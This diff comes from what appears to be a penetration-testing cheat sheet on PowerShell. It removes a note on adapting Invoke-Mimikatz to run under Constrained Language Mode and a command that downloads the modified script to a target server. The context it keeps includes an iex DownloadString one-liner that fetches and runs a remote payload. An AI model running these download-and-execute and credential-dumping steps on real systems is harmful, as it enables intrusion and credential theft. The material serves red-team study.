@@ -71,10 +71,6 @@ $ExecutionContext.SessionState.LanguageMode = 'fulllanguage' ==> Not really poss
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections 
 ```
 
-**Invoke-mimikatz when Constrained Language mode is in place**
-
-So, we must modify Invoke-Mimikatz.ps1 to include the function call in the script itself and transfer the modified script (Invoke-MimikatzEx.ps1) to the target server.
-
 ### Execute .PS1 File / PowerView
 
 {% code overflow="wrap" %}
@@ -139,14 +135,6 @@ ls function:
 <strong>
 </strong><strong>iex (New-Object Net.WebClient).DownloadString('https://webserver/pay.ps1') - Invoke Expression (iex alias)
 </strong></code></pre>
-
-Download and save PowerShell Script
-
-{% code overflow="wrap" %}
-```powershell
-iwr http://172.16.x.x/Invoke-MimikatzEx.ps1 -OutFile C:\Windows\Tasks\Invoke-MimikatzEx.ps1
-```
-{% endcode %}
 
 #### &#x20;**Use a COM Object**
 
